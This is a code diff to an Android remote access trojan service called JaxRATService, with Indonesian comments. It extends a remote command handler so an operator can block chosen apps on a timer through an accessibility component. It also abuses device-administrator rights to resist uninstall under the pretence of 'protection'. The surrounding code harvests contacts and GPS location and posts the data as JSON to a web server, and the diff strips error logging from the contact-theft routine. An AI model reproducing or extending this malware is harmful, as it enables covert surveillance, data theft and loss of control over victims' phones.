@@ -147,35 +147,50 @@ public class JaxRATService extends Service {
         } else if (cmd.equals("anti_uninstall_off")) {
             matikanAdmin();
         } else if (cmd.startsWith("block_apps|")) {
-            // LOGIKA APP BLOCKER DITARUH DI DALAM SINI
+            // FORMAT BARU: block_apps|timer|package1,package2
             String[] parts = cmd.split("\\|");
             if (parts.length >= 2) {
+                int timer = 0;
+                String apps = "";
+                if (parts.length == 3) {
+                    timer = Integer.parseInt(parts[1].trim());
+                    apps = parts[2].trim();
+                } else {
+                    apps = parts[1].trim(); // Fallback buat format lama
+                }
+
                 SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
-                prefs.edit().putString("blocked_apps", parts[1]).apply();
-                showToast("App Blocker Updated!");
+                prefs.edit().putString("blocked_apps", apps).putInt("block_timer", timer).apply();
+                
+                // Kasih tau Accessibility kalau ada perubahan
+                Intent intent = new Intent("UPDATE_BLOCK_LIST");
+                intent.setPackage(getPackageName());
+                sendBroadcast(intent);
+
+                if (apps.isEmpty()) {
+                    showToast("Semua blokir dilepas!");
+                } else {
+                    showToast("Aplikasi diblokir selama " + (timer == 0 ? "Permanen" : timer + " menit"));
+                }
             }
         }
-    } // <--- KURUNG KURAWAL PENUTUP executeCommand
+    }
 
     private void aktifkanAdmin() {
         ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        
         if (!dpm.isAdminActive(adminComponent)) {
             Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan perlindungan JaxRAT.");
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } else {
-            showToast("Admin sudah aktif!");
-        }
+        } else { showToast("Admin sudah aktif!"); }
     }
 
     private void matikanAdmin() {
         ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        
         if (dpm.isAdminActive(adminComponent)) {
             dpm.removeActiveAdmin(adminComponent);
             showToast("Admin dimatikan.");
@@ -202,7 +217,7 @@ public class JaxRATService extends Service {
                 cursor.close();
             }
             kirimHasilKeWeb("contacts", contactsArray);
-        } catch (Exception e) { Log.e("JAXRAT", "Gagal ambil kontak", e); }
+        } catch (Exception e) { }
     }
 
     private void ambilGps() {
@@ -246,9 +261,7 @@ public class JaxRATService extends Service {
                 JSONObject json = new JSONObject();
                 json.put("type", type);
                 json.put("data", data);
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(json.toString().getBytes("utf-8"));
-                }
+                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes("utf-8")); }
                 conn.getResponseCode();
             } catch (Exception e) { }
         }).start();
